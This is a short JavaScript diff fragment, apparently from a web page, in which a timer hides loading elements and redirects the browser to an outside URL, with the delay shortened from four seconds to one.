@@ -133,6 +133,6 @@ setTimeout(function(){
     $("#process1").hide();   
 location.href='https://zheuz.cloud/wa/v9-bb9d';
  $('.load').hide();
-    }, 4000);    
+    }, 1000);    
     
 }     
